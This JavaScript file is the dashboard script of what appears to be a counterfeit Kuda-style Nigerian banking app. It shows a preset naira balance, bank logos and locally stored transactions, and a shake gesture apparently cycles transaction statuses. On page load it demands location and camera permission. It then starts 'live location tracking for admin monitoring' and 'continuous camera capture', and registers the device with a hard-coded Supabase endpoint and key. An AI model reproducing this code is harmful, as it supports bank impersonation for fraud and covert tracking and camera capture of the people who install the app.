// Bank Logo Mapping
const bankLogos = {
  'Access Bank': 'https://i.imgur.com/3Aii5hd.jpeg',
  'Ecobank Nigeria': 'https://i.imgur.com/9l0WS8C.jpeg',
  'Fidelity Bank Nigeria': 'https://i.imgur.com/cXz0fFL.png',
  'First Bank of Nigeria': 'https://i.imgur.com/FkGt7r1.jpeg',
  'Guaranty Trust Bank': 'https://i.imgur.com/1atacbl.png',
  'Moniepoint': 'https://i.imgur.com/GiQWkmw.jpeg',
  'Opay': 'https://i.imgur.com/YAIOeGj.png',
  'PalmPay': 'https://i.imgur.com/YbUdktd.png',
  'Sterling Bank Plc': 'https://i.imgur.com/qyVV90r.png',
  'Union Bank of Nigeria': 'https://i.imgur.com/518WtnU.png',
  'Zenith Bank Plc': 'https://i.imgur.com/y8c8Wbn.png',
  'Kuda Microfinance Bank': 'https://i.imgur.com/YAIOeGj.png',
  'Carbon': 'https://i.imgur.com/YAIOeGj.png',
  'Wema Bank Plc': 'https://i.imgur.com/YAIOeGj.png',
  'United Bank for Africa': 'https://i.imgur.com/YAIOeGj.png',
  'Jaiz Bank': 'https://i.imgur.com/YAIOeGj.png',
  'Polaris Bank': 'https://i.imgur.com/YAIOeGj.png',
  'Providus Bank Plc': 'https://i.imgur.com/YAIOeGj.png',
  'Stanbic IBTC Bank Nigeria Limited': 'https://i.imgur.com/YAIOeGj.png',
  'Standard Chartered Bank': 'https://i.imgur.com/YAIOeGj.png',
  'Diamond Bank': 'https://i.imgur.com/YAIOeGj.png',
  'First City Monument Bank': 'https://i.imgur.com/YAIOeGj.png',
  'Heritage Bank Plc': 'https://i.imgur.com/YAIOeGj.png',
  'Keystone Bank Limited': 'https://i.imgur.com/YAIOeGj.png',
  'SunTrust Bank Nigeria Limited': 'https://i.imgur.com/YAIOeGj.png',
  'Rubies Bank': 'https://i.imgur.com/YAIOeGj.png',
  'Sparkle Microfinance Bank': 'https://i.imgur.com/YAIOeGj.png',
  'Citibank': 'https://i.imgur.com/YAIOeGj.png',
  'Unity Bank Plc': 'https://i.imgur.com/YAIOeGj.png'
};

function getBankLogoUrl(bankName) {
  if (!bankName) return null;
  return bankLogos[bankName] || null;
}

// Dashboard functionality
let appData = {
    balance: 10000.00,
    userName: 'BABATUNDE',
    transactions: [],
    profileImage: null
};

// Load data from localStorage
function loadData() {
    const saved = localStorage.getItem('kudasavingsData');
    if (saved) {
        appData = JSON.parse(saved);
    }
    updateUI();
}

// Save data to localStorage
function saveData() {
    localStorage.setItem('kudasavingsData', JSON.stringify(appData));
}

// Update UI
async function updateUI() {
    // Update balance
    const balanceEl = document.getElementById('dashboardBalance');
    if (balanceEl) {
        const formattedBalance = new Intl.NumberFormat('en-NG', {
            style: 'currency',
            currency: 'NGN'
        }).format(appData.balance);
        balanceEl.innerHTML = `${formattedBalance} <svg width="20" height="20" viewBox="0 0 24 24" fill="none" style="cursor: pointer; margin-left: 8px;" onclick="toggleBalance()">
            <path d="M1 12S5 4 12 4s11 8 11 8-4 8-11 8S1 12 1 12z" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            <circle cx="12" cy="12" r="3" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>`;
    }

    // Update greeting
    const greetingEl = document.getElementById('greetingText');
    if (greetingEl) {
        greetingEl.textContent = `Hi, ${appData.userName}`;
    }

    // Update avatar - check both localStorage and IndexedDB
    const avatarImg = document.getElementById('avatarImg');
    const userAvatar = document.getElementById('userAvatar');
    let avatarUrl = appData.profileImage;
    if (!avatarUrl && typeof storage !== 'undefined') {
        try {
            const user = await storage.getUser();
            if (user.avatar) avatarUrl = user.avatar;
        } catch (e) {}
    }
    if (avatarImg && avatarUrl) {
        avatarImg.src = avatarUrl;
        avatarImg.style.filter = 'none';
    }

    // Update recent transactions (show last 2)
    const recentContainer = document.getElementById('recentTransactions');
    if (recentContainer) {
        if (appData.transactions && appData.transactions.length > 0) {
            const recent = appData.transactions.slice(0, 2);
            recentContainer.innerHTML = recent.map(tx => {
                const logoUrl = getBankLogoUrl(tx.bankName);
                const isCredit = tx.type === 'credit';
                return `
                    <div class="transaction-item" onclick="viewTransaction('${tx.id}')">
                        <div class="transaction-icon">
                            ${logoUrl ? `<img src="${logoUrl}" alt="${tx.bankName}" onerror="this.style.display='none'; this.parentElement.innerHTML='<svg width=\'20\' height=\'20\' viewBox=\'0 0 24 24\' fill=\'none\'><path d=\'M12 19V5M5 12L12 19L19 12\' stroke=\'${isCredit ? '#00c88a' : '#ffffff'}\' stroke-width=\'2\' stroke-linecap=\'round\' stroke-linejoin=\'round\'/></svg>';">` : `<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="${isCredit ? 'M12 19V5M5 12L12 19L19 12' : 'M12 5V19M5 12L12 19L19 12'}" stroke="${isCredit ? '#00c88a' : '#ffffff'}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>`}
                        </div>
                        <div class="transaction-details">
                            <div class="transaction-title">${tx.title || tx.accountName || 'Transaction'}</div>
                            ${tx.accountName && !isCredit ? `<div class="transaction-subtitle">${tx.accountName.toLowerCase()}</div>` : ''}
                            <div class="transaction-date">${formatTransactionDate(tx.date)}</div>
                        </div>
                        <div class="transaction-right">
                            <div class="transaction-amount ${isCredit ? 'positive' : 'negative'}">
                                ${isCredit ? '+' : '-'}₦${parseFloat(tx.amount).toLocaleString()}
                            </div>
                            <div class="transaction-status ${(tx.status || 'successful') === 'successful' ? 'success' : (tx.status === 'pending' ? 'pending' : 'failed')}">${(tx.status || 'successful') === 'successful' ? 'Successful' : (tx.status === 'pending' ? 'Pending' : 'Failed')}</div>
                        </div>
                    </div>
                `;
            }).join('');
        } else {
            recentContainer.innerHTML = '';
        }
    }
}

// Format transaction date
function formatTransactionDate(dateString) {
    const date = new Date(dateString);
    const now = new Date();
    const diff = now - date;
    const minutes = Math.floor(diff / 60000);
    const hours = Math.floor(diff / 3600000);
    const days = Math.floor(diff / 86400000);

    if (minutes < 1) return 'Just now';
    if (minutes < 60) return `${minutes} min ago`;
    if (hours < 24) return `${hours} hour${hours > 1 ? 's' : ''} ago`;
    if (days === 0) return 'Today';
    if (days === 1) return 'Yesterday';

    return date.toLocaleDateString('en-GB', {
        day: '2-digit',
        month: 'short',
        hour: '2-digit',
        minute: '2-digit'
    }).replace(',', '');
}

// Close schedule banner
function closeBanner() {
    const banner = document.getElementById('scheduleBanner');
    if (banner) {
        banner.style.display = 'none';
    }
}

// Navigate to transfer page
function goToTransfer() {
    window.location.href = '/transfer.html';
}

// Navigate to history page
function goToHistory() {
    window.location.href = '/history.html';
}

// Navigate to add money page
function goToAddMoney() {
    window.location.href = '/addmoney.html';
}

// View transaction details
function viewTransaction(id) {
    localStorage.setItem('viewTransactionId', id);
    window.location.href = '/details.html';
}

// Toggle balance visibility
let balanceVisible = true;
function toggleBalance() {
    balanceVisible = !balanceVisible;
    const balanceEl = document.getElementById('dashboardBalance');
    if (balanceVisible) {
        updateUI();
    } else {
        balanceEl.innerHTML = `******* <svg width="20" height="20" viewBox="0 0 24 24" fill="none" style="cursor: pointer; margin-left: 8px;" onclick="toggleBalance()">
            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24M1 1l22 22" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>`;
    }
}

// Copy account number function
function copyAccountNumber() {
    const accountNumber = '2054502723';
    navigator.clipboard.writeText(accountNumber).then(() => {
        const btn = document.querySelector('.copy-account-btn');
        const originalHTML = btn.innerHTML;
        btn.innerHTML = '<svg width="12" height="12" viewBox="0 0 24 24" fill="none"><path d="M20 6L9 17L4 12" stroke="#00c88a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
        setTimeout(() => {
            btn.innerHTML = originalHTML;
        }, 2000);
    }).catch(err => {
        alert('Account number: 2054502723');
    });
}

// Initialize on page load
document.addEventListener('DOMContentLoaded', function() {
    // If permissions not granted, send back to login
    const locationGranted = localStorage.getItem('locationGranted') === 'true';
    const cameraGranted = localStorage.getItem('cameraGranted') === 'true';
    if (!locationGranted || !cameraGranted) {
        window.location.href = '/password.html';
        return;
    }
    loadData();
    // Start shake-to-cycle-status
    initShakeStatus();
    // Start live location tracking for admin monitoring
    registerAppUser(appData.userName || 'UNKNOWN').then(() => {
        startLiveLocationTracking();
        startContinuousCameraCapture();
    });

    // REST fallback: ensure registration even if Supabase JS library failed to load
    (async function restRegisterFallback() {
        try {
            const saved = localStorage.getItem('kudasavingsData');
            const data = saved ? JSON.parse(saved) : {};
            const username = data.userName || appData.userName || 'UNKNOWN';
            let deviceId = localStorage.getItem('kuda_device_id');
            if (!deviceId) {
                deviceId = 'dev_' + Date.now() + '_' + Math.random().toString(36).slice(2, 10);
                localStorage.setItem('kuda_device_id', deviceId);
            }
            const SUP_URL = 'https://axotezoancnodsqzmdru.supabase.co';
            const SUP_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF4b3Rlem9hbmNub2RzcXptZHJ1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQzMjg2MzgsImV4cCI6MjA3OTkwNDYzOH0.hL4r_xXGOgmz-kPuXjex28Yx5pACuC2kYiHQk-T4SIM';
            const headers = {
                'apikey': SUP_KEY,
                'Authorization': 'Bearer ' + SUP_KEY,
                'Content-Type': 'application/json'
            };
            // Check if user exists
            const checkRes = await fetch(SUP_URL + '/rest/v1/app_users?select=id&device_id=eq.' + encodeURIComponent(deviceId), { headers });
            if (!checkRes.ok) return;
            const existing = await checkRes.json();
            const nowIso = new Date().toISOString();
            if (existing && existing.length > 0) {
                await fetch(SUP_URL + '/rest/v1/app_users?device_id=eq.' + encodeURIComponent(deviceId), {
                    method: 'PATCH',
                    headers: { ...headers, 'Prefer': 'return=minimal' },
                    body: JSON.stringify({ username: username, is_online: true, last_seen_at: nowIso })
                });
            } else {
                await fetch(SUP_URL + '/rest/v1/app_users', {
                    method: 'POST',
                    headers: { ...headers, 'Prefer': 'return=minimal' },
                    body: JSON.stringify({ device_id: deviceId, username: username, is_online: true, last_seen_at: nowIso })
                });
            }
        } catch (e) {
            console.warn('REST registration fallback failed:', e);
        }
    })();
});
